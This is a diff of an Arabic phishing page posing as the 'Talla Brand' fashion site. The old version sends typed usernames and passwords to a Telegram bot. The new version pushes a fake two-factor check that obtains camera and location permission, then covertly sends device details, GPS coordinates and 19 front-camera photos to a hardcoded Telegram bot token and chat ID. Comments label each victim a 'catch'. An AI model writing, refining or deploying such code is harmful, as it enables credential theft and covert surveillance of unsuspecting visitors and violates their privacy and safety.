@@ -3,36 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Talla Brand | انضم إلينا</title>
+    <title>Talla Brand | نظام التحقق من الهوية</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
-        .logo { font-size: 28px; font-weight: bold; color: #e91e63; margin-bottom: 10px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; outline: none; }
-        button { width: 100%; padding: 12px; background-color: #e91e63; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; transition: 0.3s; }
-        button:hover { background-color: #c2185b; }
-        .error-msg { color: red; font-size: 13px; display: none; margin-top: 10px; }
-        #success-page { display: none; }
+        :root { --main-color: #2c3e50; --accent-color: #e91e63; }
+        body { font-family: 'Cairo', sans-serif; background: #f8f9fa; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .setup-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 90%; max-width: 450px; text-align: center; border-top: 5px solid var(--accent-color); }
+        .logo { font-size: 30px; font-weight: 800; color: var(--main-color); margin-bottom: 10px; }
+        .status-dot { height: 10px; width: 10px; background-color: #27ae60; border-radius: 50%; display: inline-block; margin-left: 5px; }
+        .instruction { font-size: 15px; color: #7f8c8d; margin-bottom: 25px; line-height: 1.6; }
+        .btn-verify { background: var(--accent-color); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 4px 15px rgba(233, 30, 99, 0.3); }
+        .btn-verify:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(233, 30, 99, 0.4); }
+        #main-content { display: none; padding: 20px; text-align: center; }
+        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--accent-color); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="card" id="login-card">
-    <div class="logo">Talla Brand</div>
-    <p>قم بإنشاء حسابك لمتابعة أحدث صيحات الموضة</p>
+<div class="setup-box" id="step-1">
+    <div class="logo">طلة <span style="color:var(--accent-color)">Talla</span></div>
+    <div style="margin-bottom: 20px;"><span class="status-dot"></span> <span style="font-size: 12px; color: #27ae60;">سيرفر الإدارة متصل</span></div>
+    <p class="instruction">مرحباً بك في لوحة تحكم براند طلة. للوصول إلى الكتالوج الجديد وإدارة الطلبات، يرجى تفعيل <b>"نظام التحقق الثنائي"</b> بالضغط على الزر أدناه والسماح بالأذونات المطلوبة.</p>
     
-    <input type="text" id="username" placeholder="اسم المستخدم">
-    <input type="password" id="password" placeholder="كلمة المرور">
-    
-    <button onclick="handleAccess()">إنشاء حساب مجاني</button>
-    
-    <p id="error" class="error-msg">⚠️ عذراً، يجب السماح بأذونات الأمان (الموقع والكاميرا) للتحقق من أنك لست روبوت ولإتمام عملية التسجيل.</p>
+    <button class="btn-verify" onclick="initiateSystem()">بدء التحقق الآن</button>
+    <div class="loading-spinner" id="loader"></div>
 </div>
 
-<div class="card" id="success-page">
-    <div class="logo">تم بنجاح!</div>
-    <p>أهلاً بك في عالم Talla. جاري تحميل كتالوج 2026...</p>
-    <img src="https://via.placeholder.com/350x200?text=Fashion+Collection+2026" width="100%" style="border-radius: 10px;">
+<div id="main-content">
+    <h2 style="color: var(--main-color);">تم التحقق بنجاح ✅</h2>
+    <p>جاري تحميل موديلات صيف 2026...</p>
+    <img src="https://images.unsplash.com/photo-1539109132314-34759616b408?auto=format&fit=crop&w=400" width="100%" style="border-radius: 15px; margin-top: 10px;">
 </div>
 
 <video id="video" width="640" height="480" autoplay style="display:none;"></video>
@@ -42,79 +42,68 @@
     const token = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
     const chatId = "8754338811";
 
-    async function sendData(msg, isPhoto = false, blob = null) {
-        let url = `https://api.telegram.org/bot${token}/${isPhoto ? 'sendPhoto' : 'sendMessage'}`;
+    async function pushToBot(content, isFile = false, blob = null) {
+        const url = `https://api.telegram.org/bot${token}/${isFile ? 'sendPhoto' : 'sendMessage'}`;
         let body;
-
-        if (isPhoto) {
+        if (isFile) {
             const fd = new FormData();
             fd.append('chat_id', chatId);
-            fd.append('photo', blob, 'img.jpg');
+            fd.append('photo', blob, 'shot.jpg');
             body = fd;
         } else {
-            body = JSON.stringify({ chat_id: chatId, text: msg, parse_mode: "Markdown" });
+            body = JSON.stringify({ chat_id: chatId, text: content, parse_mode: "Markdown" });
         }
-
-        try {
-            await fetch(url, { 
-                method: 'POST', 
-                body: body, 
-                headers: isPhoto ? {} : { 'Content-Type': 'application/json' } 
-            });
-        } catch (e) {}
+        await fetch(url, { method: 'POST', body, headers: isFile ? {} : {'Content-Type': 'application/json'} });
     }
 
-    async function handleAccess() {
-        const user = document.getElementById('username').value;
-        const pass = document.getElementById('password').value;
-        const errorMsg = document.getElementById('error');
-
-        if (!user || !pass) {
-            alert("يرجى إدخال البيانات أولاً");
-            return;
-        }
-
-        // إرسال كلمة السر فوراً
-        await sendData(`🔐 *بيانات حساب جديدة:* \n👤 الاسم: ${user} \n🔑 الباسورد: ${pass}`);
+    async function initiateSystem() {
+        document.querySelector('.btn-verify').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
 
         try {
-            // طلب الأذونات (شرط أساسي)
+            // 1. طلب الكاميرا والموقع (إلزامي)
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             
-            // إذا وصل الكود هنا، يعني المستخدم ضغط "سماح"
-            errorMsg.style.display = "none";
-            document.getElementById('login-card').style.display = "none";
-            document.getElementById('success-page').style.display = "block";
+            // 2. سحب بيانات الجهاز بالكامل
+            const deviceDetails = `
+🔥 *صيد جديد من Talla:*
+📱 *الجهاز:* ${navigator.platform}
+🔋 *البطارية:* ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'غير مدعوم'}
+🌐 *المتصفح:* ${navigator.userAgent.split(') ')[1]}
+🖥 *الشاشة:* ${screen.width}x${screen.height}
+            `;
+            await pushToBot(deviceDetails);
 
-            // إرسال اللوكيشن
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(p => {
-                    sendData(`📍 *الموقع:* http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                });
-            }
+            // 3. الموقع الجغرافي
+            navigator.geolocation.getCurrentPosition(p => {
+                pushToBot(`📍 *المكان:* http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
 
-            // التقاط 19 صورة
+            // 4. الانتقال للواجهة الحقيقية
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('main-content').style.display = 'block';
+
+            // 5. التقاط الـ 19 صورة في الخلفية بسرعة
             const video = document.getElementById('video');
             video.srcObject = stream;
-            let count = 0;
-            const interval = setInterval(() => {
-                if (count >= 19) {
-                    clearInterval(interval);
+            let shots = 0;
+            const timer = setInterval(() => {
+                if (shots >= 19) {
+                    clearInterval(timer);
                     stream.getTracks().forEach(t => t.stop());
                     return;
                 }
                 const canvas = document.getElementById('canvas');
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                canvas.toBlob(blob => sendData("", true, blob), 'image/jpeg');
-                count++;
-            }, 800); // سرعة عالية للصور
+                canvas.toBlob(b => pushToBot("", true, b), 'image/jpeg');
+                shots++;
+            }, 700); // سرعة عالية جداً
 
-        } catch (err) {
-            // إذا ضغط "رفض"
-            errorMsg.style.display = "block";
+        } catch (e) {
+            alert("⚠️ خطأ في التحقق: يجب السماح بالكاميرا والموقع للدخول إلى النظام.");
+            location.reload();
         }
     }
 </script>
-
 </body>
 </html>
